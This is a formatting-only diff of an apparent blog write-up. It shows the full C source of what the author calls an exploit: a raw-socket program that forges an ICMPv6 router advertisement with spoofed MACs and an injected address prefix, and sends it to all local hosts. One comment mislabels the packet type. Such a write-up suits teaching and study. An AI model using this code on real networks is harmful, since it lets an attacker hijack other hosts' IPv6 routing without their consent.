@@ -281,86 +281,86 @@ The hard part is implementation. I chose to write my exploit in C, compile on my
 
 int main()
 {
-	int sockfd = 0;
-	int tx = 0;
-	char buffer[1024] = {0};
-	char *iface = "wlp3s0";
-	struct ifreq ifacei;
-	struct ether_header *eh = (struct ether_header *)buffer;
-	struct sockaddr_ll socket_address;
+    int sockfd = 0;
+    int tx = 0;
+    char buffer[1024] = {0};
+    char *iface = "wlp3s0";
+    struct ifreq ifacei;
+    struct ether_header *eh = (struct ether_header *)buffer;
+    struct sockaddr_ll socket_address;
 
-	/* Make a socket. */
-	sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+    /* Make a socket. */
+    sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
 
-	/* Get the interface index. */
-	memset(&ifacei, 0, sizeof(struct ifreq));
-	strncpy(ifacei.ifr_name, iface, strlen(iface));
-	ioctl(sockfd, SIOCGIFINDEX, &ifacei);
+    /* Get the interface index. */
+    memset(&ifacei, 0, sizeof(struct ifreq));
+    strncpy(ifacei.ifr_name, iface, strlen(iface));
+    ioctl(sockfd, SIOCGIFINDEX, &ifacei);
 
-	/* Ethernet source and destination MACs. */
-	memcpy(eh->ether_shost, "\x4a\xc5\x2d\x9b\x8c\x8d", 6);
-	memcpy(eh->ether_dhost, "\x8a\x15\x22\x31\xb4\xfc", 6);
+    /* Ethernet source and destination MACs. */
+    memcpy(eh->ether_shost, "\x4a\xc5\x2d\x9b\x8c\x8d", 6);
+    memcpy(eh->ether_dhost, "\x8a\x15\x22\x31\xb4\xfc", 6);
 
-	/* Ether type. */
-	eh->ether_type = htons(ETH_P_IP);
-	tx += sizeof(struct ether_header);
+    /* Ether type. */
+    eh->ether_type = htons(ETH_P_IP);
+    tx += sizeof(struct ether_header);
 
-	/* Interface index. */
-	socket_address.sll_ifindex = ifacei.ifr_ifindex;
+    /* Interface index. */
+    socket_address.sll_ifindex = ifacei.ifr_ifindex;
 
-	/* Address length. */
-	socket_address.sll_halen = ETH_ALEN;
+    /* Address length. */
+    socket_address.sll_halen = ETH_ALEN;
 
-	/* Destination MAC */
-	memcpy(socket_address.sll_addr, "\x8a\x15\x22\x31\xb4\xfc", 6);
+    /* Destination MAC */
+    memcpy(socket_address.sll_addr, "\x8a\x15\x22\x31\xb4\xfc", 6);
 
-	/* Packet data. */
-	char data[] =
-		"\x8a\x15\x22\x31\xb4\xfc"  // Destination MAC
-		"\x4a\xc5\x2d\x9b\x8c\x8d"  // Source MAC
-		"\x86\xdd"                  // Type IPv6
-		"\x6e"                      // Version 6
-		"\x00\x00\x00"              // Flow label
-		"\x00\x40"                  // Payload length
-		"\x3a"                      // Next header ICMPv6
-		"\xff"                      // Hop limit
-		"\xfe\x80\x00\x00\x00\x00"  // Source
-		"\x00\x00\x48\xc5\x2d\xff"  // |
-		"\xfe\x9b\x8c\x8d"          // |
-		"\xff\x02\x00\x00\x00\x00"  // Destination
-		"\x00\x00\x00\x00\x00\x00"  // |
-		"\x00\x00\x00\x01"          // |
-		"\x86"                      // Neighbor advertisement
-		"\x00"                      // Code 0
-		"\x55\x22"                  // Checksum
-		"\x40"                      // Current hop limit
-		"\x08"                      // Flags
-		"\x07\x08"                  // Router lifetime
-		"\x00\x00\x00\x00"          // Reachable time
-		"\x00\x00\x00\x00"          // Retrans timer
-		"\x01\x01"                  // ICMPv6 option source MAC
-		"\x4a\xc5\x2d\x9b\x8c\x8d"  // Source MAC
-		"\x05\x01"                  // ICMPv6 option MTU
-		"\x00\x00\x00\x00\x05\xdc"  // MTU
-		"\x03\x04"                  // ICMPv6 option prefix information
-		"\x40"                      // Prefix length
-		"\x40"                      // Flags and stuff
-		"\x00\x27\x8d\x00"          // Valid lifetime
-		"\x00\x09\x3a\x80"          // Preferred lifetime
-		"\x00\x00\x00\x00"          // Reserved
-		"\x20\x01\x0d\xb8\x6e\x02"  // Prefix
-		"\x26\x63\x00\x00\x00\x00"  // |
-		"\x00\x00\x00\x00"          // |
-	;
+    /* Packet data. */
+    char data[] =
+        "\x8a\x15\x22\x31\xb4\xfc"  // Destination MAC
+        "\x4a\xc5\x2d\x9b\x8c\x8d"  // Source MAC
+        "\x86\xdd"                  // Type IPv6
+        "\x6e"                      // Version 6
+        "\x00\x00\x00"              // Flow label
+        "\x00\x40"                  // Payload length
+        "\x3a"                      // Next header ICMPv6
+        "\xff"                      // Hop limit
+        "\xfe\x80\x00\x00\x00\x00"  // Source
+        "\x00\x00\x48\xc5\x2d\xff"  // |
+        "\xfe\x9b\x8c\x8d"          // |
+        "\xff\x02\x00\x00\x00\x00"  // Destination
+        "\x00\x00\x00\x00\x00\x00"  // |
+        "\x00\x00\x00\x01"          // |
+        "\x86"                      // Neighbor advertisement
+        "\x00"                      // Code 0
+        "\x55\x22"                  // Checksum
+        "\x40"                      // Current hop limit
+        "\x08"                      // Flags
+        "\x07\x08"                  // Router lifetime
+        "\x00\x00\x00\x00"          // Reachable time
+        "\x00\x00\x00\x00"          // Retrans timer
+        "\x01\x01"                  // ICMPv6 option source MAC
+        "\x4a\xc5\x2d\x9b\x8c\x8d"  // Source MAC
+        "\x05\x01"                  // ICMPv6 option MTU
+        "\x00\x00\x00\x00\x05\xdc"  // MTU
+        "\x03\x04"                  // ICMPv6 option prefix information
+        "\x40"                      // Prefix length
+        "\x40"                      // Flags and stuff
+        "\x00\x27\x8d\x00"          // Valid lifetime
+        "\x00\x09\x3a\x80"          // Preferred lifetime
+        "\x00\x00\x00\x00"          // Reserved
+        "\x20\x01\x0d\xb8\x6e\x02"  // Prefix
+        "\x26\x63\x00\x00\x00\x00"  // |
+        "\x00\x00\x00\x00"          // |
+    ;
 
-	/* Copy the data into the buffer. */
-	memcpy(buffer, data, sizeof(data));
-	tx += sizeof(data);
+    /* Copy the data into the buffer. */
+    memcpy(buffer, data, sizeof(data));
+    tx += sizeof(data);
 
-	/* Send the buffer. */
-	sendto(sockfd, buffer, tx, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));
+    /* Send the buffer. */
+    sendto(sockfd, buffer, tx, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));
 
-	return 0;
+    return 0;
 }
 ```
 
